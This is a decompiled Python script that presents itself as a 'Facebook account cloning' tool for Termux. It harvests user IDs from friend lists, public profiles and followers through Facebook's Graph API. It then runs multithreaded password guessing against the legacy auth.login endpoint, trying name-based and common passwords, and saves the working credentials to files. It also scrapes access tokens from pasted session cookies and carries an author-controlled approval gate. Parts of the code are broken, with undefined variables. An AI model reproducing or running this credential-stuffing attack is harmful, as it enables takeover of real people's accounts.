# Decompiled By Sayyed Zakarya
# Github : https://github.com/aryanotriks
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:58:25) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: aso
import os, sys, time, datetime, re, threading, json, random, requests, hashlib, cookielib, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
__author__ = 'Sayyed Zakarya'
__copyright = 'All rights reserved . Copyright  Sayyed Zakarya'
os.system('termux-setup-storage')
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000, 40000)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 
   'x-fb-net-hni': repr(sim), 
   'x-fb-connection-quality': 'EXCELLENT', 
   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
   'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 
   'content-type': 'application/x-www-form-urlencoded', 
   'x-fb-http-engine': 'Liger'}
os.system('git pull')
os.system('clear')
logo = """
\033[1;94m  _______ _____  _   _ _____  ___    _     _ _____ 
\033[1;92m (_____  )  _  )( ) ( )  _  )|  _ \ ( )   ( )  _  )
\033[1;93m      / /| (_) || |/ /| (_) || (_) ) \ \_/ /| (_) |
\033[1;95m    / /  (  _  )|   ( (  _  )|    /    \ /  (  _  )
\033[1;94m  / / ___| | | || |\ \| | | || |\ \    | |  | | | |
\033[1;96m (_______)_) (_)( ) (_)_) (_)(_) (_)   (_)  (_) (_)
\033[1;97m                /(                                 
\033[1;94m               (__)                  
 \033[37;1m[\033[41;1m FACEBOOK ACCOUNT CLONING \033[00;1m\033[37;1m ]\n
 \033[32;1mCreator \033[37;1m: \033[33;1mSayyed-Zakarya
 \033[32;1mVersion \033[37;1m: \033[33;1m1.2
"""
def reg():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1mTake The Approval For Login'
    print ''
    time.sleep(1)
    try:
        to = open('/sdcard/.hst.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/aryanotriks/Filecrack/main/server.txt').text
    if to in r:
        os.system('cd ..... && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd ..... && node index.js &')
        time.sleep(5)
        ip()
    else:
        os.system('clear')
        print logo
        print '\tApproved Failed'
        print ' \x1b[1;92mYour Id Is Not Approved Already '
        print ' \x1b[1;92mCopy the id and send to admin'
        print ' \x1b[1;92mYour id: ' + to
        raw_input('\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+923472860857')
        reg()


def reg2():
    os.system('clear')
    print logo
    print '\tApproval not detected'
    print ' \x1b[1;92mCopy and press enter , then select whatsapp to continue'
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    raw_input(' Press enter to go to whatsapp ')
    os.system('xdg-open https://wa.me/+923472860857')
    sav = open('/sdcard/.hst.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;92m Press enter to check Approval ')
    reg()


def ip():
    os.system('clear')
    print logo
    print '\tCollecting device info'
    try:
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        ips = z['query']
        country = z['country']
        regi = z['regionName']
        network = z['isp']
    except:
        pass

    print '\x1b[1;92m Your ip: ' + ips
    time.sleep(1)
    print '\x1b[1;92m Your country: ' + country
    time.sleep(1)
    print '\x1b[1;92m Your region: ' + regi
    time.sleep(1)
    print ' \x1b[1;92mYour network: ' + network
    time.sleep(1)
    print ' Loading ...'
    time.sleep(1)
    log_menu()


def log_menu():
    try:
        t_check = open('access_token.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\x1b[1;93m ~~~~ Login menu ~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;92m[1] Login with FaceBook'
        print '\x1b[1;92m[2] Login with token'
        print '\x1b[1;92m[3] Login with cookies'
        print ''
        log_menu_s()


def log_menu_s():
    s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Mr-Robot\xe2\x9e\xa4 ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '3':
        log_cookie()
    else:
        print ''
        print '\\ Select valid option '
        print ''
        log_menu_s()


def log_fb():
    os.system('clear')
    print logo
    print '\x1b[1;31;1mLogin with id/pass'
    print 47 * '-'
    lid = raw_input('\x1b[1;92m Id/mail/no: ')
    pwds = raw_input(' \x1b[1;93mPassword: ')
    try:
        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
        q = json.loads(data)
        if 'loc' in q:
            ts = open('access_token.txt', 'w')
            ts.write(q['loc'])
            ts.close()
            menu()
        elif 'www.facebook.com' in q['error']:
            print ' User must verify account before login'
            raw_input('\x1b[1;92m Press enter to try again ')
            log_fb()
        else:
            print ' Id/Pass may be wrong'
            raw_input(' \x1b[1;92mPress enter to try again ')
            log_fb()
    except:
        print ''
        print 'Exiting tool'
        os.system('exit')


def log_token():
    os.system('clear')
    print logo
    print '\x1b[1;93mLogin with token\x1b[1;91m'
    print 47 * '-'
    tok = raw_input(' \x1b[1;92mPaste token here: \x1b[1;91m')
    print 47 * '-'
    t_s = open('access_token.txt', 'w')
    t_s.write(tok)
    t_s.close()
    menu()


def log_cookie():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1mLogin Cookies'
    print ''
    try:
        cookie = raw_input(' Paste cookies here: ')
        data = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8', 
           'cookie': cookie}
        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=data)
        c2 = re.search('(EAAA\\w+)', c1.text)
        hasil = c2.group(1)
        ok = open('access_token.txt', 'w')
        ok.write(hasil)
        ok.close()
        menu()
    except AttributeError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \x1b[1;92mPress enter to try again ')
        log_menu()
    except UnboundLocalError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \x1b[1;92mPress enter to try again ')
        log_menu()
    except requests.exceptions.SSLError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \x1b[1;92mPress enter to try again ')
        log_menu()


def menu():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        print ''
        print logo
        print '\x1b[1;31;1mLogin FB id to continue'
        time.sleep(1)
        log_menu()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        z = q['name']
    except (KeyError, IOError):
        print logo
        print ''
        print '\t Account Cheekpoint\x1b[0;97m'
        print ''
        os.system('rm -rf access_token.txt')
        time.sleep(1)
        log_menu()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\t Turn on mobile data/wifi\x1b[0;97m'
        print ''
        raw_input(' \x1b[1;92mPress enter after turning on mobile data/wifi ')
        menu()


    print("")
 
    print("\t\033[1;92mActive Token.... : " +nm)
 
    print("")
 
    print("\033[1;97m[1]\033[1;92mClone From Friendlist")
 
    print("")
 
    print("\033[1;97m[2]\033[1;92mClone From Public id")
 
    print("")
 
    print("\033[1;97m[3]\033[1;92mClone From Followers id")
 
    print("")
 
    print("\033[1;97m[0]\033[1;97mEXIT MY TOOL")
 
    print("")
 
    menu_select()
 
def menu_select():
 
	select = raw_input("\033[1;97m Choose Option : ")
 
	id=[]
 
	oks=[]
 
	cps=[]
 
	if select=="1":
 
		os.system("clear")
 
		print logo
 
		print("")
 
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
 
		z = json.loads(r.text)
 
		for s in z["data"]:
 
			uid=s['id']
 
			na=s['name']
 
			nm=na.rsplit(" ")[0]
 
			id.append(uid+'='+nm)
 
	if select =="2":
 
		os.system("clear")
 
		print(logo)
 
		print("")
 
		idt = raw_input("\033[1;97m[#] Put ID Link :\033[1;96m ")
 
		os.system("clear")
 
		print logo
 
		try:
 
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
 
			q = json.loads(r.text)
 
			print("[!] Target from : "+q["name"])
 
		except (KeyError , IOError):
 
		    print("")
 
		    print("\033[1;91your login account has checkpoint").center(50)
 
		    print("")
 
		    menu()
 
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
 
		z = json.loads(r.text)
 
		for i in z["data"]:
 
			uid=i['id']
 
			na=i['name']
 
			nm=na.rsplit(" ")[0]
 
			id.append(uid+'='+nm)
 
	elif select =="3":
 
		os.system("clear")
 
		print logo
 
		print("")
 
		idt = raw_input("\033[1;97m[#] Put ID Link :\033[1;96m ")
 
		os.system("clear")
 
		print logo
 
		try:
 
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
 
			q = json.loads(r.text)
 
			print(" Target from  : "+q["name"])
 
		except (KeyError , IOError):
 
		    print("")
 
		    print("\033[1;91m login id has checkpoint").center(50)
 
		    print("")
 
		    time.sleep(3)
 
		    menu()
 
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)
 
		z = json.loads(r.text)
 
		for i in z["data"]:
 
			uid=i['id']
 
			na=i['name']
 
			nm=na.rsplit(" ")[0]
 
			id.append(uid+'='+nm)
 
	elif select =="0":
 
	    os.system("exit")
 
	else:
 
	    print("")
 
	    print("Please Select A Valid Option").center(50)
 
	    time.sleep(2)
 
	    menu_select()
 
	print("[#] Total IDs..... : "+str(len(id)))
 
	time.sleep(0.5)
 
	print("[#] Please Wait Untill The Process Stop.....")
 
	print 47*("-")
 
	print('')
 
	
 
	def main(arg):
 
		user=arg
 
		uid,name=user.split("=")
 
		try:
 
		    pass1=name+"123"
 
		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		    d=json.loads(q)
 
		    if 'www.facebook.com' in d['error_msg']:
 
		        print("\033[1;93m[7DAYS>CP] "+uid+" = "+pass1)
 
		        cp=open("mzcp.txt","a")
 
		        cp.write(uid+" = "+pass1+"\n")
 
		        cp.close()
 
		        cps.append(uid)
 
		    else:
 
		    	if "access_token" in d:
 
		            print("\x1b[1;97m[HAM = OK] "+uid+" = "+pass1+"\x1b[1;0m")
 
		            ok=open("mzok.txt","a")
 
		            ok.write(uid+" = "+pass1+"\n")
 
		            ok.close()
 
		            oks.append(uid)
 
		        else:
 
		            pass2=name+"12345"
 
		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		            d=json.loads(q)
 
		            if 'www.facebook.com' in d['error_msg']:
 
		                print("\033[1;93m[7DAYS>CP] "+uid+" = "+pass2)
 
		                cp=open("mzcp.txt","a")
 
		                cp.write(uid+" = "+pass2+"\n")
 
		                cp.close()
 
		                cps.append(uid)
 
		            else:
 
		                if 'access_token' in d:
 
		                    print("\x1b[1;97m[HAM = OK] "+uid+" = "+pass2+"\x1b[1;0m")
 
		                    ok=open("mzok.txt","a")
 
		                    ok.write(uid+" = "+pass2+"\n")
 
		                    ok.close()
 
		                    oks.append(uid)
 
		                else:
 
		                    pass3=name+"786786"
 
		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		                    d=json.loads(q)
 
		                    if 'www.facebook.com' in d['error_msg']:
 
		                        print("\033[1;93m[7days>CP] "+uid+" = "+pass3)
 
		                        cp=open("mzcp.txt","a")
 
		                        cp.write(uid+" = "+pass3+"\n")
 
		                        cp.close()
 
		                        cps.append(uid)
 
		                    else:
 
		                        if 'access_token' in d:
 
		                            print("\x1b[1;97m[HAM = OK] "+uid+" = "+pass3+"\x1b[1;0m")
 
		                            ok=open("mzok.txt","a")
 
		                            ok.write(uid+" = "+pass3+"\n")
 
		                            ok.close()
 
		                            oks.append(uid)
 
		                        else:
 
		                            pass4=name+"1122"
 
		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		                            d=json.loads(q)
 
		                            if 'www.facebook.com' in d['error_msg']:
 
		                                print("\033[1;93m[7DAYS>CP] "+uid+" = "+pass4)
 
		                                cp=open("mzcp.txt","a")
 
		                                cp.write(uid+" = "+pass4+"\n")
 
		                                cp.close()
 
		                                cps.append(uid)
 
		                            else:
 
		                                if 'access_token' in d:
 
		                                    print("\x1b[1;97m[HAM = OK] "+uid+" = "+pass4+"\x1b[1;0m")
 
		                                    ok=open("mzok.txt","a")
 
		                                    ok.write(uid+" = "+pass4+"\n")
 
		                                    ok.close()
 
		                                    oks.append(uid)
 
		                                else:
 
		                                    pass5="112233"
 
		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		                                    d=json.loads(q)
 
		                                    if 'www.facebook.com' in d['error_msg']:
 
		                                        print("\033[1;93m[7DAYS>CP] "+uid+" = "+pass5)
 
		                                        cp=open("mzcp.txt","a")
 
		                                        cp.write(uid+" = "+pass5+"\n")
 
		                                        cp.close()
 
		                                        cps.append(uid)
 
		                                    else:
 
		                                        if 'access_token' in d:
 
		                                            print("\x1b[1;97m[HAM = OK] "+uid+" = "+pass5+"\x1b[1;0m")
 
		                                            ok=open("mzok.txt","a")
 
		                                            ok.write(uid+" = "+pass5+"\n")
 
		                                            ok.close()
 
		                                            oks.append(uid)
 
		                                        else:
 
		                                            pass6="223344"
 
		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		                                            d=json.loads(q)
 
		                                            if 'www.facebook.com' in d['error_msg']:
 
		                                                print("\033[1;93m[7DAYS>CP] "+uid+" = "+pass6)
 
		                                                cp=open("mzcp.txt","a")
 
		                                                cp.write(uid+" = "+pass6+"\n")
 
		                                                cp.close()
 
		                                                cps.append(uid)
 
		                                            else:
 
		                                                if 'access_token' in d:
 
		                                                    print("\x1b[1;97m[HAM = OK] "+uid+" = "+pass6+"\x1b[1;0m")
 
		                                                    ok=open("mzok.txt","a")
 
		                                                    ok.write(uid+" = "+pass6+"\n")
 
		                                                    ok.close()
 
		                                                    oks.append(uid)
 
		                                                else:
 
		                                                    pass7="pakistan"
 
		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text
 
		                                                    d=json.loads(q)
 
		                                                    if 'www.facebook.com' in d['error_msg']:
 
		                                                        print("\033[1;93m[7DAYS>CP] "+uid+" = "+pass7)
 
		                                                        cp=open("mzcp.txt","a")
 
		                                                        cp.write(uid+" = "+pass7+"\n")
 
		                                                        cp.close()
 
		                                                        cps.append(uid)
 
		                                                    else:
 
		                                                        if 'access_token' in d:
 
		                                                            print("\x1b[1;97m[HAM = OK] "+uid+" = "+pass7+"\x1b[1;0m")
 
		                                                            ok=open("mzok.txt","a")
 
		                                                            ok.write(uid+" = "+pass7+"\n")
 
		                                                            ok.close()
 
		                                                            oks.append(uid)
 
									
 
															
 
		except:
 
			pass
 
		
 
	p = ThreadPool(30)
 
	p.map(main, id)
 
	print (" ")
 
	print (47*"-")
 
	print ("[!] Process has completed")
 
	print ("[!] Now You Get Out Total Cp/Ok : "+str(len(cps)) + "/"+str(len(oks)))
 
	print (47*"-")
 
	raw_input("\t\x1b[0;97mPress enter to main menu back")
 
	menu()
 
	
 
if __name__ == '__main__':
 
    main()
 
